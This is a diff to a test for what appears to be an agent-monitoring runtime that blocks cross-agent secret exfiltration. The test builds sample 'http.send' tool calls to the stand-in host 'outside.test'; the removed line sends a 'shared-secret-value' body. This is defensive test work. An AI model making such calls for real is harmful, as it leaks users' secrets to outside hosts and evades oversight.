@@ -340,7 +340,7 @@ async def test_cross_agent_same_task_data_flow_is_detected_but_other_task_isolat
     )
     isolated = await functions.invoke(
         tool_name="http.send",
-        arguments={"url": "https://outside.test", "body": "shared-secret-value"},
+        arguments={"url": "https://outside.test", "body": "independent-public-value"},
         context=RuntimeContext(
             principal="user", session_id="multi", task_id="task-2", agent_id="agent-b"
         ),
@@ -350,6 +350,7 @@ async def test_cross_agent_same_task_data_flow_is_detected_but_other_task_isolat
     assert blocked.decision.action == DecisionAction.BLOCK
     assert "sensitive_data_exfiltration" in blocked.decision.rule_ids
     assert isolated.decision.action == DecisionAction.AUDIT
+    assert "sensitive_data_exfiltration" not in isolated.decision.rule_ids
     assert sent == 1
     assert len([node for node in graph.nodes.values() if isinstance(node, AgentNode)]) == 2
     assert any(edge.edge_type == GraphEdgeType.DELEGATES_TO for edge in graph.edges.values())
